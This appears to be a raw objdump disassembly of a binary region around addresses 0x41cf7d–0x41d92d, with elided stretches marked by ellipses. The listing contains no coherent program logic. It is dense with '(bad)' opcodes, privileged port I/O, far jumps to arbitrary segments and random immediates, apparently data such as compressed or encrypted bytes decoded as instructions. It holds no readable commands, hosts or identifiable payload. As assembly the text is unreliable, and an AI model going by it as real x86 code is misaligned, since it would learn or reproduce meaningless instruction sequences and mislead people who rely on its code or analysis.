  41cf7d:	mov    ds:0xf3b4b266,eax
  41cf82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf83:	pusha  
  41cf84:	imul   ecx,DWORD PTR [esi],0x3388f54f
  41cf8a:	mov    BYTE PTR [ebp+edx*4+0x3f],cl
  41cf8e:	inc    BYTE PTR [esi+0x27db3a5f]
  41cf94:	aaa    
  41cf95:	inc    esp
  41cf96:	out    0xf9,al
  41cf98:	in     eax,0x47
  41cf9a:	sub    al,0xc6
  41cf9c:	mov    edx,DWORD PTR [ebx+0x73]
  41cf9f:	and    DWORD PTR [edx],ebx
  41cfa1:	out    dx,eax
  41cfa2:	arpl   WORD PTR [esi],cx
  41cfa4:	mov    ebp,DWORD PTR [ebp+eiz*4+0x11]
  41cfa8:	cmp    eax,ebx
  41cfaa:	pushw  ss
  41cfac:	jg     0x41cfbd
  41cfae:	sub    DWORD PTR [eax],ecx
  41cfb0:	add    dl,BYTE PTR [edi*1-0x6b279dd4]
  41cfb7:	push   es
  41cfb8:	dec    DWORD PTR [ebx-0x20909069]
  41cfbe:	in     al,dx
  41cfbf:	(bad)  
  41cfc1:	push   ds
  41cfc2:	pop    esi
  41cfc3:	js     0x41cf74
  41cfc5:	(bad)  
  41cfc6:	loopne 0x41d00c
  41cfc8:	xchg   edx,eax
  41cfc9:	pop    esp
  41cfca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfcb:	or     BYTE PTR [esi+edx*1-0x79],0x72
  41cfd0:	je     0x41d015
  41cfd2:	dec    ecx
  41cfd3:	fs out 0xc,al
  41cfd6:	out    dx,eax
  41cfd7:	adc    cl,dh
  41cfd9:	fxch   st(0)
  41cfdb:	ds ja  0x41cfec
  41cfde:	add    DWORD PTR [edx+0x75],esp
  41cfe1:	xchg   edx,eax
  41cfe2:	imul   esp,DWORD PTR [edi+0x11],0xffffff9c
  41cfe6:	mov    bh,0x80
  41cfe8:	lods   al,BYTE PTR ds:[esi]
  41cfe9:	sbb    eax,ecx
  41cfeb:	push   edi
  41cfec:	inc    ebx
  41cfed:	pop    ss
  41cfee:	cmp    esi,DWORD PTR [ebp-0x10959a2]
  41cff4:	push   0xffffffae
  41cff6:	and    ah,cl
  41cff8:	in     al,dx
  41cff9:	xor    al,0xfc
  41cffb:	sbb    ebx,DWORD PTR [edx-0x5856aa8c]
  41d001:	cs repz sub eax,0x124152ad
  41d008:	popa   
  41d009:	lods   al,BYTE PTR ds:[esi]
  41d00a:	sub    BYTE PTR [edx+0x23],dl
  41d00d:	mov    bl,0x19
  41d00f:	cld    
  41d010:	shl    DWORD PTR [ebp+0x21],cl
  41d013:	cmp    ah,0xee
  41d016:	inc    esi
  41d017:	in     eax,dx
  41d018:	ds cdq 
  41d01a:	test   BYTE PTR [esi],0xf9
  41d01d:	int3   
  41d01e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d01f:	icebp  
  41d020:	and    esp,esp
  41d022:	xchg   esi,eax
  41d023:	outs   dx,DWORD PTR ds:[esi]
  41d024:	mov    ebx,0x7e671fc4
  41d029:	mov    ds:0xa40fae9b,eax
  41d02e:	sub    al,0x40
  41d030:	sbb    DWORD PTR [ebx],ecx
  41d032:	shl    DWORD PTR [ebx+0x7e],cl
  41d035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d036:	aas    
  41d037:	sbb    DWORD PTR [ebx],0x64e8537d
  41d03d:	sub    BYTE PTR [edi],dh
  41d03f:	ja     0x41d038
  41d041:	mov    ebp,0xa24ee151
  41d046:	mov    BYTE PTR [edi+0x30],bl
  41d049:	popa   
  41d04a:	xchg   edx,eax
  41d04b:	mov    DWORD PTR [ebp+0x7bc910de],eax
  41d051:	rcl    DWORD PTR [eax+0x28c15990],0x2f
  41d058:	mov    ebp,0x20e8c733
  41d05d:	(bad)  
  41d05e:	dec    esp
  41d05f:	pop    ebx
  41d060:	mov    ds:0x7c651bdc,al
  41d065:	xchg   DWORD PTR [eax+0x2a],ecx
  41d068:	jae    0x41d09d
  41d06a:	jecxz  0x41d0a8
  41d06c:	daa    
  41d06d:	mov    eax,ds:0x0
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0xadb6bd
  41d0e5:	pop    ebp
  41d0e6:	cmp    BYTE PTR [bx+di],al
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    DWORD PTR [eax],eax
  41d0ed:	add    BYTE PTR [ebx],ch
  41d0ef:	call   0xda80:0x668ca451
  41d0f6:	gs and al,ah
  41d0f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0fa:	sbb    ah,dl
  41d0fc:	mov    ch,0xa
  41d0fe:	mov    cl,0x90
  41d100:	mov    ss,ebp
  41d102:	sub    al,0xfc
  41d104:	test   al,0xa4
  41d106:	and    bh,ch
  41d108:	xor    eax,0x17619a8c
  41d10d:	cmp    eax,0xe13e808d
  41d112:	rcl    DWORD PTR [esi-0x1090ff67],cl
  41d118:	loopne 0x41d0f9
  41d11a:	jp     0x41d0d6
  41d11c:	xor    esi,DWORD PTR [edi-0x105dd76]
  41d122:	adc    al,0x41
  41d124:	push   ebx
  41d125:	xchg   edx,eax
  41d126:	ins    DWORD PTR es:[edi],dx
  41d127:	mov    BYTE PTR ds:0xb66ff16d,al
  41d12d:	loope  0x41d19d
  41d12f:	cmp    edi,edx
  41d131:	imul   eax,ecx,0xffffffad
  41d134:	mov    esp,0x7fb10b12
  41d139:	imul   BYTE PTR [edx-0x2080e67e]
  41d13f:	mov    al,ds:0xea83af60
  41d144:	es cdq 
  41d146:	mov    ds:0x5b7f52ff,eax
  41d14b:	popa   
  41d14c:	nop
  41d14d:	bound  ebp,QWORD PTR [ebx]
  41d14f:	outs   dx,BYTE PTR ds:[esi]
  41d150:	ins    DWORD PTR es:[edi],dx
  41d151:	mov    esi,0xe4f12da6
  41d156:	pusha  
  41d157:	cld    
  41d158:	pop    ss
  41d159:	lods   eax,DWORD PTR ds:[esi]
  41d15a:	(bad)  
  41d15b:	cmc    
  41d15c:	pop    ebx
  41d15d:	js     0x41d1d5
  41d15f:	or     DWORD PTR [edx],esp
  41d161:	addr16 loope 0x41d13e
  41d164:	push   eax
  41d165:	aam    0x72
  41d167:	cwde   
  41d168:	aam    0x2d
  41d16a:	xchg   BYTE PTR [esi],bl
  41d16c:	mov    edi,0x1df2a24a
  41d171:	mov    ebp,0xab5ea68b
  41d176:	adc    bh,cl
  41d178:	mov    esp,0x1b2d24db
  41d17d:	cld    
  41d17e:	cmp    BYTE PTR [ebp+0x61ecd094],dl
  41d184:	pop    ebx
  41d185:	std    
  41d186:	and    DWORD PTR [ebx],0x2b
  41d189:	jnp    0x41d1ee
  41d18b:	ror    esi,1
  41d18d:	jno    0x41d1f2
  41d18f:	in     eax,dx
  41d190:	adc    bl,dl
  41d192:	movd   DWORD PTR [edi-0x4f1d5696],mm4
  41d199:	lods   eax,DWORD PTR ds:[si]
  41d19b:	mul    ebx
  41d19d:	jecxz  0x41d1b6
  41d19f:	loop   0x41d137
  41d1a1:	jmp    0x41d187
  41d1a3:	ret    0xa2b8
  41d1a6:	fwait
  41d1a7:	repnz add ecx,DWORD PTR [ebx]
  41d1aa:	cmp    BYTE PTR [ebp-0x51],ch
  41d1ad:	mov    al,ds:0x144e0029
  41d1b2:	xor    al,0x7c
  41d1b4:	in     al,dx
  41d1b5:	mov    esi,0x7c50fcbd
  41d1ba:	and    al,bh
  41d1bc:	jmp    0xf2d2:0xb18f38a
  41d1c3:	push   esp
  41d1c4:	mov    dl,0x1a
  41d1c6:	mov    ?,ebp
  41d1c8:	ss out dx,eax
  41d1ca:	lods   eax,DWORD PTR ds:[esi]
  41d1cb:	mov    bl,BYTE PTR [ecx-0x5c]
  41d1ce:	das    
  41d1cf:	push   cs
  41d1d0:	xor    DWORD PTR [esi-0x2],esp
  41d1d3:	mov    esi,0xb007d241
  41d1d8:	push   edx
  41d1d9:	mov    esi,0xa07c0948
  41d1de:	enter  0xf9e1,0xb1
  41d1e2:	or     dh,bl
  41d1e4:	cmp    BYTE PTR [edx+0x57],ah
  41d1e7:	or     BYTE PTR [esi-0x7f3b2834],0xae
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	mov    ah,0xcc
  41d264:	gs mov edi,0x13967
  41d26a:	add    BYTE PTR [ecx],al
  41d26c:	add    BYTE PTR [eax],al
  41d26e:	mov    DWORD PTR [esi],eax
  41d270:	adc    edx,DWORD PTR [edi+0x63635750]
  41d276:	and    bh,BYTE PTR [ebp+0x8]
  41d279:	push   es
  41d27a:	shl    bl,0x47
  41d27d:	call   0xbae9:0xf64a0dbc
  41d284:	jno    0x41d2dd
  41d286:	(bad)  
  41d287:	fcomp  st(7)
  41d289:	ja     0x41d211
  41d28b:	add    eax,0x2b48466d
  41d290:	xor    eax,0x8a359c5a
  41d295:	retf   0xe82f
  41d298:	dec    esi
  41d299:	and    al,dl
  41d29b:	cmp    ebp,DWORD PTR ds:0x5e9c7fe4
  41d2a1:	xor    esp,DWORD PTR [ecx-0x34]
  41d2a4:	sbb    DWORD PTR ds:0x454b14ad,ecx
  41d2aa:	xor    BYTE PTR [edi+0x31a76b75],dl
  41d2b0:	push   ebp
  41d2b1:	dec    ecx
  41d2b2:	shl    BYTE PTR [ebx+0x1f],1
  41d2b5:	mov    eax,0xf8ff72a8
  41d2ba:	inc    esi
  41d2bb:	retf   
  41d2bc:	sbb    eax,0xc233c39b
  41d2c1:	dec    esp
  41d2c2:	xchg   ebp,eax
  41d2c3:	push   ss
  41d2c4:	cli    
  41d2c5:	push   cs
  41d2c6:	or     al,0xfd
  41d2c8:	jmp    0xc5f:0x66d37c68
  41d2cf:	and    eax,DWORD PTR [esi+edi*2+0x31]
  41d2d3:	in     al,dx
  41d2d4:	xchg   esp,eax
  41d2d5:	aad    0xbf
  41d2d7:	ds jg  0x41d2c1
  41d2da:	or     DWORD PTR [ecx],0xd23ef0b6
  41d2e0:	xor    eax,0xbcb696fa
  41d2e5:	in     al,dx
  41d2e6:	cmp    BYTE PTR [ebp-0x3a],dh
  41d2e9:	mov    cl,0x39
  41d2eb:	test   eax,0xb76efd10
  41d2f0:	loope  0x41d2d6
  41d2f2:	les    esp,FWORD PTR [ecx-0x5b39fa4b]
  41d2f8:	out    dx,al
  41d2f9:	inc    eax
  41d2fa:	mov    ebx,0xc11cb5b0
  41d2ff:	test   BYTE PTR [edx],dh
  41d301:	cs loope 0x41d31f
  41d304:	outs   dx,BYTE PTR ds:[esi]
  41d305:	sbb    al,0x2c
  41d307:	jae    0x41d2d8
  41d309:	das    
  41d30a:	test   BYTE PTR [ebp+0x21b2d6a7],dh
  41d310:	push   ecx
  41d311:	loop   0x41d2a8
  41d313:	add    esp,eax
  41d315:	mov    ebx,0xf4eac20c
  41d31a:	and    edi,DWORD PTR [edx-0x324e1fd]
  41d320:	mov    ch,0x5a
  41d322:	in     al,dx
  41d323:	repnz loop 0x41d2e7
  41d326:	cli    
  41d327:	icebp  
  41d328:	jmp    0x806b:0x5477cd18
  41d32f:	mov    al,0x7d
  41d331:	mov    eax,ds:0xd4a867d7
  41d336:	cmp    esp,DWORD PTR [ebx-0x1bf1441e]
  41d33c:	data16 jecxz 0x41d35d
  41d33f:	mov    bh,0x7b
  41d341:	mov    ch,0x17
  41d343:	add    eax,0xe9a4fe5b
  41d348:	lock es in eax,dx
  41d34b:	std    
  41d34c:	inc    edx
  41d34d:	fisub  WORD PTR [ebp+ebp*4+0x1aca1fe6]
  41d354:	js     0x41d387
  41d356:	jmp    0xad9d:0x2f74595f
  41d35d:	adc    al,0x3d
  41d35f:	push   esp
  41d360:	fsub   st,st(4)
  41d362:	arpl   WORD PTR [ebx],sp
  41d364:	loop   0x41d2ee
  41d366:	shl    BYTE PTR [esi+0x594868c3],0xaf
  41d36d:	test   al,0x0
	...
  41d3d3:	add    BYTE PTR [eax],al
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx+0x12],0x62
  41d3e4:	xchg   edx,eax
  41d3e5:	fldenv [edi+0x3a]
  41d3e8:	add    DWORD PTR [eax],eax
  41d3ea:	add    BYTE PTR [ecx],al
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	sbb    edi,DWORD PTR [esi]
  41d3f0:	outs   dx,DWORD PTR ds:[esi]
  41d3f1:	and    cl,dl
  41d3f3:	sbb    DWORD PTR [ebp+0x62],eax
  41d3f6:	sub    al,BYTE PTR [ebp-0xb]
  41d3f9:	jl     0x41d39e
  41d3fb:	inc    ebp
  41d3fc:	push   edi
  41d3fd:	mov    bh,0xd7
  41d3ff:	sbb    edx,esi
  41d401:	addr16 test esi,0x346075a2
  41d408:	mov    al,0x56
  41d40a:	push   ecx
  41d40b:	mov    eax,ds:0x47ca0435
  41d410:	mov    esi,0x86666cf8
  41d415:	out    dx,eax
  41d416:	pop    eax
  41d417:	jne    0x41d3ba
  41d419:	xchg   ebp,eax
  41d41a:	inc    esi
  41d41b:	sub    ebx,0x24443353
  41d421:	inc    edx
  41d422:	sub    ebp,ebp
  41d424:	(bad)  [esi+eax*4-0x4a6b73b]
  41d42b:	xlat   BYTE PTR ds:[ebx]
  41d42c:	mov    cl,0xca
  41d42e:	jmp    0x62b6:0x815ae8b8
  41d435:	pop    edi
  41d436:	aad    0x6c
  41d438:	mov    al,0xa8
  41d43a:	mov    cl,0x8c
  41d43c:	leave  
  41d43d:	cs pusha 
  41d43f:	arpl   WORD PTR [edi+0x0],bx
  41d442:	and    esi,edx
  41d444:	jg     0x41d480
  41d446:	call   0x17e2:0x995e7d11
  41d44d:	retf   
  41d44e:	retf   
  41d44f:	xchg   ebx,eax
  41d450:	cmp    dh,BYTE PTR [ebx-0x494ed1a0]
  41d456:	add    eax,0x1eb16b9d
  41d45b:	jb     0x41d427
  41d45d:	mov    DWORD PTR [edi],edx
  41d45f:	or     edi,DWORD PTR [esi-0x64546b88]
  41d465:	jp     0x41d498
  41d467:	lock scas eax,DWORD PTR es:[edi]
  41d469:	mov    eax,0x38067666
  41d46e:	pop    ds
  41d46f:	jl     0x41d3fa
  41d471:	ins    DWORD PTR es:[edi],dx
  41d472:	xor    BYTE PTR [ebx+eax*2],cl
  41d475:	dec    eax
  41d476:	int3   
  41d477:	xlat   BYTE PTR ds:[ebx]
  41d478:	mov    BYTE PTR [eax-0xf],cl
  41d47b:	outs   dx,BYTE PTR ds:[esi]
  41d47c:	in     al,0xea
  41d47e:	jmp    0x41d405
  41d480:	jb     0x41d417
  41d482:	aam    0xbc
  41d484:	iret   
  41d485:	pop    es
  41d486:	ss mov dh,0x83
  41d489:	mov    edx,0x762de291
  41d48e:	push   es
  41d48f:	mov    esp,0xb7f075ed
  41d494:	jl     0x41d4e6
  41d496:	fcomp  DWORD PTR [ecx-0x26c534ec]
  41d49c:	int    0xf2
  41d49e:	arpl   WORD PTR [edx-0x67b054e2],si
  41d4a4:	sub    esi,esp
  41d4a6:	mov    cl,0x5f
  41d4a8:	sbb    BYTE PTR ds:[eax-0x65],dh
  41d4ac:	cdq    
  41d4ad:	dec    edx
  41d4ae:	xchg   esp,eax
  41d4af:	pop    ds
  41d4b0:	jmp    0x41d4b2
  41d4b2:	ret    
  41d4b3:	pop    eax
  41d4b4:	pop    eax
  41d4b5:	sub    BYTE PTR [edx],ah
  41d4b7:	xchg   ebp,eax
  41d4b8:	fs ss out 0x6,eax
  41d4bc:	js     0x41d443
  41d4be:	add    eax,0x756a1bf9
  41d4c3:	and    esp,DWORD PTR [edi+0x58c91d0e]
  41d4c9:	xchg   edi,eax
  41d4ca:	ins    DWORD PTR es:[edi],dx
  41d4cb:	ja     0x41d492
  41d4cd:	pop    ds
  41d4ce:	mov    ecx,0xf24fe726
  41d4d3:	inc    esp
  41d4d4:	lock xchg ebp,edx
  41d4d7:	(bad)
  41d4db:	push   edx
  41d4dc:	mov    esp,DWORD PTR [ebx]
  41d4de:	leave  
  41d4df:	and    dl,bl
  41d4e1:	into   
  41d4e2:	sub    DWORD PTR [ebp+0x10f1d34a],eax
  41d4e8:	loop   0x41d486
  41d4ea:	sbb    bh,BYTE PTR [ebp-0x3]
  41d4ed:	adc    BYTE PTR [eax],al
	...
  41d553:	add    BYTE PTR [eax],al
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x6713:0x99c29f89
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [edx-0x2c0d3ea8],dl
  41d573:	sub    DWORD PTR [esi+0x2e6a634f],eax
  41d579:	xchg   ebp,eax
  41d57a:	and    dh,BYTE PTR [ebx+0x4f]
  41d57d:	mov    bh,0x1f
  41d57f:	cmp    eax,0x7fd6cdd5
  41d584:	lds    ecx,FWORD PTR [edx]
  41d586:	and    DWORD PTR [edx-0x63],0x2e
  41d58a:	mov    ah,0xd6
  41d58c:	and    eax,0x5134511a
  41d591:	loope  0x41d56b
  41d593:	into   
  41d594:	sub    DWORD PTR [eax],esp
  41d596:	mov    ds:0x5ee8a0ad,eax
  41d59b:	pusha  
  41d59c:	xchg   edx,esp
  41d59e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d59f:	pop    edx
  41d5a0:	mov    edi,0x3687e37a
  41d5a5:	retf   0x64d4
  41d5a8:	in     eax,0x7e
  41d5aa:	jecxz  0x41d538
  41d5ac:	and    DWORD PTR [esi+0x568b3033],ebp
  41d5b2:	dec    esp
  41d5b3:	lahf   
  41d5b4:	sbb    eax,ebp
  41d5b6:	fwait
  41d5b7:	shr    DWORD PTR [edi-0x70],cl
  41d5ba:	jmp    0x41d5d0
  41d5bc:	or     DWORD PTR [ebp+0x3b],ebp
  41d5bf:	xchg   esi,eax
  41d5c0:	push   esi
  41d5c1:	push   ebx
  41d5c2:	adc    DWORD PTR [ecx],ecx
  41d5c4:	dec    ebx
  41d5c5:	mov    cl,0x3e
  41d5c7:	sar    DWORD PTR [edi+0x156c3223],0x27
  41d5ce:	add    BYTE PTR [edx],bl
  41d5d0:	dec    edi
  41d5d1:	or     bl,BYTE PTR [esi]
  41d5d3:	and    ch,BYTE PTR [ecx]
  41d5d5:	mov    edi,0xcda84589
  41d5da:	inc    esi
  41d5db:	cmovle ecx,DWORD PTR [eax+ecx*1+0x5f]
  41d5e0:	mov    DWORD PTR [esp+eax*2],edx
  41d5e3:	push   ecx
  41d5e4:	ret    0x9e8f
  41d5e7:	jns    0x41d600
  41d5e9:	in     al,dx
  41d5ea:	out    0x42,eax
  41d5ec:	mov    dh,0xc5
  41d5ee:	(bad)  
  41d5ef:	rol    bh,1
  41d5f1:	fisub  WORD PTR [edx+0x14]
  41d5f4:	and    eax,0x5ab7be56
  41d5f9:	mov    cl,0xe1
  41d5fb:	div    BYTE PTR [bp-0x9bc]
  41d600:	daa    
  41d601:	pop    ds
  41d602:	fidivr DWORD PTR [edi]
  41d604:	adc    DWORD PTR [ecx+0x64ebc4d1],0x1e
  41d60b:	xchg   esp,eax
  41d60c:	out    0x7d,eax
  41d60e:	and    al,0xeb
  41d610:	repz inc esi
  41d612:	int3   
  41d613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d614:	scas   eax,DWORD PTR es:[edi]
  41d615:	adc    bh,al
  41d617:	enter  0xfa34,0xda
  41d61b:	fstp   DWORD PTR [edi-0x70]
  41d61e:	fwait
  41d61f:	aaa    
  41d620:	and    bl,BYTE PTR [esi-0x26]
  41d623:	sub    BYTE PTR ds:0xb6651287,0xd8
  41d62a:	fidivr DWORD PTR [ebx]
  41d62c:	in     al,0xc1
  41d62e:	btc    DWORD PTR [ecx],edx
  41d631:	sbb    DWORD PTR [edi],ecx
  41d633:	fdivr  DWORD PTR [esp+eax*4-0x6dd28d62]
  41d63a:	aam    0x8
  41d63c:	es cwde 
  41d63e:	bound  ebp,QWORD PTR [eax]
  41d640:	adc    eax,0x80f7ab14
  41d645:	inc    esp
  41d646:	mov    cl,BYTE PTR [edi+0x62]
  41d649:	shl    al,1
  41d64b:	rcr    BYTE PTR [eax],0x95
  41d64e:	enter  0xffb4,0xfb
  41d652:	or     ebp,ebp
  41d654:	test   DWORD PTR [ebx],0xd031427e
  41d65a:	in     eax,dx
  41d65b:	cwde   
  41d65c:	lods   al,BYTE PTR ds:[esi]
  41d65d:	and    ch,BYTE PTR [ebx-0x12c9ee38]
  41d663:	cs cmp ecx,edx
  41d666:	inc    ecx
  41d667:	mov    es,WORD PTR [eax-0x1cd1fe11]
	...
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x66e435
  41d6e3:	mov    bh,0x96
  41d6e5:	in     al,0x67
  41d6e7:	cmp    al,0x1
  41d6e9:	add    BYTE PTR [eax],al
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    BYTE PTR [edx],dl
  41d6ef:	cs stos BYTE PTR es:[edi],al
  41d6f1:	jp     0x41d68e
  41d6f3:	pop    ebp
  41d6f4:	mov    ds:0xb1382e0d,eax
  41d6f9:	jle    0x41d74c
  41d6fb:	int3   
  41d6fc:	mov    cl,0xfb
  41d6fe:	pop    edx
  41d6ff:	(bad)  
  41d700:	(bad)  
  41d703:	popf   
  41d704:	aaa    
  41d705:	pop    ds
  41d706:	push   0xffffffc7
  41d708:	cwde   
  41d709:	sar    DWORD PTR [edi],1
  41d70b:	xor    eax,0xe54c2624
  41d710:	mov    ah,0xcd
  41d712:	dec    edx
  41d713:	(bad)  
  41d714:	mov    dh,cl
  41d716:	sti    
  41d717:	adc    BYTE PTR [esi+ecx*4+0x63],dl
  41d71b:	retf   
  41d71c:	add    bh,ah
  41d71e:	fwait
  41d71f:	rcr    BYTE PTR [edi-0x51],1
  41d722:	xchg   ebx,eax
  41d723:	outs   dx,BYTE PTR ds:[esi]
  41d724:	or     eax,0xc9ea999c
  41d729:	jg     0x41d791
  41d72b:	push   ebx
  41d72c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d72d:	inc    ecx
  41d72e:	mov    bh,ch
  41d730:	ins    BYTE PTR es:[edi],dx
  41d731:	leave  
  41d732:	popa   
  41d733:	hlt    
  41d734:	sar    DWORD PTR [ebx-0x21ae3426],cl
  41d73a:	sub    eax,0x24f692a5
  41d73f:	mov    ch,0x98
  41d741:	cmp    eax,0xc5735ace
  41d746:	inc    edi
  41d747:	dec    esi
  41d748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d749:	popf   
  41d74a:	retf   
  41d74b:	xor    dh,dl
  41d74d:	jge    0x41d6d0
  41d74f:	loop   0x41d75b
  41d751:	sbb    al,0x6b
  41d753:	cmp    DWORD PTR [esi-0x39bdc04],eax
  41d759:	call   0x5eefbc3c
  41d75e:	imul   eax,DWORD PTR [eax],0xffffffd1
  41d761:	push   ebp
  41d762:	ret    
  41d763:	fidivr DWORD PTR [eax+ecx*8]
  41d766:	test   BYTE PTR [esi-0x29],ah
  41d769:	(bad)  
  41d76a:	push   ss
  41d76b:	nop
  41d76c:	cmp    BYTE PTR [ecx+edi*2-0x2dc5c2ac],al
  41d773:	cld    
  41d774:	xchg   esp,eax
  41d775:	xchg   edi,eax
  41d776:	les    ebx,FWORD PTR [ebx+0x60]
  41d779:	int    0x7a
  41d77b:	xchg   esi,eax
  41d77c:	or     ah,cl
  41d77e:	ret    0xd237
  41d781:	lods   al,BYTE PTR ds:[esi]
  41d782:	cmp    DWORD PTR [ebx+0x35],ecx
  41d785:	xchg   esi,eax
  41d786:	adc    eax,0x6fd053f0
  41d78b:	lea    ecx,ds:0xaf672865
  41d791:	mov    ebp,0x340b804d
  41d796:	add    al,0xea
  41d798:	std    
  41d799:	mov    dl,0xda
  41d79b:	test   al,0xd
  41d79d:	jnp    0x41d7a2
  41d79f:	(bad)  
  41d7a0:	fdiv   QWORD PTR [esi+0x52]
  41d7a3:	sbb    eax,esi
  41d7a5:	push   edi
  41d7a6:	mov    esp,0xa6f914fc
  41d7ab:	push   esp
  41d7ac:	mov    ecx,0xf8140218
  41d7b1:	or     eax,0x4aef7b5f
  41d7b6:	fwait
  41d7b7:	xor    al,0xbc
  41d7b9:	mov    dh,0x3e
  41d7bb:	cmp    ch,BYTE PTR [ebx+0x68]
  41d7be:	pop    esi
  41d7bf:	cld    
  41d7c0:	(bad)  
  41d7c2:	xchg   ebx,eax
  41d7c3:	scas   eax,DWORD PTR es:[edi]
  41d7c4:	test   eax,0x3af56580
  41d7c9:	std    
  41d7ca:	les    ecx,FWORD PTR [edx+0x4f]
  41d7cd:	loopne 0x41d83e
  41d7cf:	sbb    ebp,DWORD PTR [ebx+0x15]
  41d7d2:	mov    WORD PTR [ecx],gs
  41d7d4:	cmp    esi,esi
  41d7d6:	pop    esi
  41d7d7:	scas   al,BYTE PTR es:[edi]
  41d7d8:	mov    dl,0x45
  41d7da:	lods   al,BYTE PTR ds:[esi]
  41d7db:	dec    ebx
  41d7dc:	sti    
  41d7dd:	jp     0x41d824
  41d7df:	sub    ch,BYTE PTR [esi]
  41d7e1:	push   eax
  41d7e2:	push   edi
  41d7e3:	dec    esi
  41d7e4:	dec    ecx
  41d7e5:	lock xor ecx,DWORD PTR [eiz*4+0x59897220]
  41d7ed:	sub    eax,DWORD PTR [eax]
	...
  41d853:	add    BYTE PTR [eax],al
  41d855:	add    BYTE PTR [esi+ecx*8],ah
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	mov    ebx,esp
  41d864:	out    0xdd,eax
  41d866:	addr16 cmp eax,0x1000001
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d86f:	mov    bh,0x2a
  41d871:	(bad)  
  41d872:	sbb    bh,BYTE PTR gs:[edx+0x14c8b1ed]
  41d879:	outs   dx,DWORD PTR ds:[esi]
  41d87a:	js     0x41d825
  41d87c:	imul   ecx,DWORD PTR [esi],0x37
  41d87f:	or     al,cl
  41d881:	and    ebx,DWORD PTR [edi]
  41d883:	inc    eax
  41d884:	js     0x41d88a
  41d886:	xor    esp,eax
  41d888:	cmp    DWORD PTR [esi],eax
  41d88a:	xchg   edi,eax
  41d88b:	in     al,0x68
  41d88d:	jo     0x41d82d
  41d88f:	cdq    
  41d890:	or     esp,ebp
  41d892:	pusha  
  41d893:	repz adc ch,BYTE PTR [ebx]
  41d896:	jae    0x41d8a4
  41d898:	call   0xff29:0xebd940c7
  41d89f:	shl    BYTE PTR [esi-0x15],1
  41d8a2:	(bad)  
  41d8a3:	sbb    ebx,DWORD PTR [ebx]
  41d8a5:	cli    
  41d8a6:	mov    WORD PTR [ecx+eiz*4-0x7c],ds
  41d8aa:	fwait
  41d8ab:	cwde   
  41d8ac:	mov    eax,0x7cb80001
  41d8b1:	std    
  41d8b2:	and    dl,al
  41d8b4:	pop    edi
  41d8b5:	test   BYTE PTR [eax-0x569517f8],0xbf
  41d8bc:	xchg   edi,eax
  41d8bd:	xor    al,0x26
  41d8bf:	clc    
  41d8c0:	jnp    0x41d85b
  41d8c2:	mov    ebp,0xeddbf6b9
  41d8c7:	mov    ?,WORD PTR [eax]
  41d8c9:	or     al,0xe3
  41d8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8cc:	out    0xa2,eax
  41d8ce:	sbb    DWORD PTR [esi],ecx
  41d8d0:	adc    BYTE PTR [eax-0x31],ah
  41d8d3:	in     eax,0xb9
  41d8d5:	loopne 0x41d89d
  41d8d7:	test   BYTE PTR [ebx],cl
  41d8d9:	rol    DWORD PTR [ecx],1
  41d8db:	dec    ebx
  41d8dc:	out    0x4b,al
  41d8de:	and    DWORD PTR es:[esi-0x363d9772],0xffffff97
  41d8e6:	pop    ss
  41d8e7:	jmp    0xc2680e88
  41d8ec:	dec    ebx
  41d8ed:	loopne 0x41d8c3
  41d8ef:	xor    BYTE PTR [edx-0x27],bl
  41d8f2:	jmp    ecx
  41d8f4:	int3   
  41d8f5:	mov    edi,DWORD PTR fs:[ecx+0x33eebf69]
  41d8fc:	sti    
  41d8fd:	ins    BYTE PTR es:[edi],dx
  41d8fe:	(bad)  
  41d8ff:	xlat   BYTE PTR ds:[ebx]
  41d900:	inc    ebx
  41d901:	aas    
  41d902:	fisttp DWORD PTR [ecx+ebp*8+0x4]
  41d906:	xlat   BYTE PTR ds:[ebx]
  41d907:	mov    esp,0x7e101fe6
  41d90c:	cld    
  41d90d:	call   FWORD PTR [ecx+0x3e0639f3]
  41d913:	add    al,0x2e
  41d915:	inc    ebp
  41d916:	and    bl,BYTE PTR [ebx+0x757300b9]
  41d91c:	(bad)  
  41d91d:	dec    DWORD PTR [edi]
  41d91f:	enterw 0x2827,0x27
  41d924:	fimul  WORD PTR [ecx+esi*1-0x12cd5a6b]
  41d92b:	pop    ebx
  41d92c:	push   cs
  41d92d:	jmp    0x707afb4a
